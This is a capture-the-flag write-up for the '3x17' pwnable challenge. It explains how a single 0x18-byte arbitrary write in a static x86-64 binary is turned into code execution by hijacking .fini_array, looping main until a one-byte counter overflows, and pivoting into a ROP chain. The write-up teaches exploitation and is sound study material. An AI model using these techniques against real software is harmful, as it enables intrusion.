3x17: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped
```

Finally, 64-bit binary. Stripped though. 

## Overview

The program prompts us, asking for `"addr:"` and `"data:"`. 
There's also a counter, making sure this is called only once. 
Notice we can write `0x18` bytes. \
Hence, the challenge idea is simple (yet challenging) - 
**having a single arbitrary write, without any leak, obtain RCE.**

Btw, 3x17 is an interesting name for a challenge, and it probably serves as some kind of hint. 

## Exploitation

### Idea (Failed) - One gadget

The first idea, of course, is to overwrite the counter, as it is placed within
some constant `.bss` address. However, right after doing so, the program would terminate. \
The second idea is to use one-gadget. By changing the program's control flow into the one-gadget address 
(which is known, as the binary is statically linked and no PIE), we would win. \
So this solves the `data` we would like to write. But which `addr` we would like to write to?
Because theres no stack leak, I aimed to obtain branch primitive by overwriting a `.fini` handler. \
Recall how `_start` invokes `main` - it calls `__libc_start_main`, with `main` address as one of its parameters. 
However, some of the other parameters are the `init, fini` code snippets. 
In this binary, `0x402960` serves as the destructor code, which would be executed right prior 
to program's termination, invoking function pointers off `.fini_array`, which is located
within `0x4b40f0` on our binary, and contains `2` default handlers. \
So in short, I'll simply execute the following:

```bash
*_fini_array[0] = one_gadget;
```

However, upon running one gadget on the static binary, I've noticed it was only compiled with part of its needed libc. \
Hence, It did not contain the code snippet that usually wrapped within `system`, and there were no references of `/bin/sh`.

### Idea - .init_array, .fini_array

As mentioned, the `.fini_array` actually contains 2 slots, and our write primitive allows `0x18` linear write. 
Hence, we can overwrite the 2 handlers that are stored there, making sure `main` would be called once again,
allowing extra invocation of the write primitive, along with setting the return address. \
**We can take this approach further** - instead of jumping back to `main`, jump back to `_start`.
By doing so, we would also first invoke the `.init_array` handlers before executing `main`. 
This also may explain why overwrite of `0x18` was given within the challenge. 
The challenge's name may hint there are `3` invocations involved, but not sure why `17` (and not `18`?) though. \
At this point, I've decided I have to go deeper into the ELF initialization & termination processes, focusing on our
controlled arrays. The [following great article][elf-start] explains exactly this.

### __libc_csu_init, __libc_csu_fini

A very good candidates we can set our `.fini_array` entry to. 
By doing so, it invokes the 2 handlers of the `.init{fini}_array` one after another, without any stack-layout requirement. \
While it doesn't seem significant, 
it actually transforms our arbtitrary-single-branch primitive into arbitrary-double-branch primitive. 
However, we still need to write our shellcode somewhere, make it executable, and jump to it. 

### Re-execution

To achieve our prerequisites for running the shellcode, we must be able to invoke the write primitive multiple times. 
Now that we can jump into any 2 addresses we wish (by jumping to the `.init_array` runner routine), we can think of some wacky ideas. \
For example, setting the second init handler to the same `.init_array` runner routine, while setting the first - to the arbitrary write within `main`. 

**The big obstacle of this challenge, is having the `counter` check within `main`**, hence - invoking main multiple times won't naively work. \ 
However, the counter is actually saved as a single byte within global variable. 
By invoking `main` 256 times, integer overflow occurs, and the counter is reset back to `0`. 
This means that by making an infinite jump trampoline to `main`, we would eventually be able to re-execute the write primitive code!

### Termination

Right upon invoking the `.fini_array` handlers within `__libc_csu_fini`, 
`rbp` is always initialized to the `.fini_array` address. 

```bash
pwndbg> x/10gx $rbp
0x4b40f0:       0x0000000000402960      0x0000000000401b6d
0x4b4100:       0x0000000d00000002      0x000000000048f7e0
```

This means that if we would find `leave ; ret` gadget, we would first load `rbp + 8` to `rsp` (`0x4b40f8` in the example),
and jump to whatever resides there. \
Hence, we shall overwrite `.fini_array[0] = leave_gadget`, and `.fini_array[1] = RA`.
The easiest way to exploit this would probably be a ROP chain, where the above `RA` stands for the first gadget's address.
